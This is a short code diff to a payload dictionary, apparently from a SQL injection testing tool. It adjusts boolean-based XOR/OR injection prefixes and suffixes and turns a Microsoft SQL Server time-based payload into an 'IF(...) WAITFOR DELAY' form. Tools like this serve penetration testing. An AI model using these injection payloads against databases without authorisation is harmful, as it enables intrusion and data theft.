@@ -414,8 +414,8 @@ PAYLOADS = {
                     {"pref": "'AND(", "suf": ")AND'Z"},
                     {"pref": "'XOR(", "suf": ")XOR'Z"},
                     {"pref": "'OR(", "suf": ")OR'Z"},
-                    {"pref": '"XOR', "suf": ')XOR"Z'},
-                    {"pref": '"OR', "suf": ')OR"Z'},
+                    {"pref": '"XOR(', "suf": ')XOR"Z'},
+                    {"pref": '"OR(', "suf": ')OR"Z'},
                     {"pref": " AND ", "suf": "-- wXyW"},
                     {"pref": "' AND ", "suf": "-- wXyW"},
                     {"pref": '" AND ', "suf": "-- wXyW"},
@@ -897,7 +897,7 @@ PAYLOADS = {
                 "dbms": "Microsoft SQL Server",
             },
             {
-                "payload": "WAITFOR DELAY '0:0:[SLEEPTIME]'",
+                "payload": "IF(5689=5689) WAITFOR DELAY '0:0:[SLEEPTIME]'",
                 "comments": [
                     {"pref": ";", "suf": "--"},
                     {"pref": "';", "suf": "--"},
@@ -934,7 +934,7 @@ PAYLOADS = {
                     {"pref": ";", "suf": "--"},
                     # {"pref": "' ", "suf": ""},
                     {"pref": "' ", "suf": "--"},
-                    {"pref": "';'", "suf": "--"},
+                    # {"pref": "';", "suf": "--"},
                     # {"pref": '" ', "suf": ""},
                     {"pref": '" ', "suf": "--"},
                     # {"pref": ") ", "suf": ""},
